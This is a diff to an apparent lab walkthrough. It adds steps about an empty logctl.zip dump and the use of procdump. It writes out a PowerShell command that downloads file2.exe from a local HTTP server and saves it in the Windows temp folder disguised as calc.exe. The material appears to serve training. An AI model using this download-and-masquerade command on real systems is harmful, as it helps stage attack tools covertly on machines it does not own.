@@ -84,7 +84,22 @@
 
    e. download it
    ![image](https://github.com/user-attachments/assets/6994c404-8d93-42f3-ae33-89e6cc34c703)
-      
+
+   f. after downloading the logctl.zip file, i'ts empty , which was weird and tried multiple ways and every time when i dump it, its empty so i had to use `procdump.exe`, i will be adding this to the lab for more fun
+   
+   ![image](https://github.com/user-attachments/assets/ab124bb5-bdf1-4a87-aaa8-0b53bb3d2869)
+
+   g. download `procdump.exe`
+      powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2:9000/file2.exe', 'C:\windows\temp\calc.exe')
+
+   ![image](https://github.com/user-attachments/assets/130132a6-b547-40f9-8a3b-9aa7bc7b2f0f)
+
+
+   
+
+
+
+
       
 ------
 
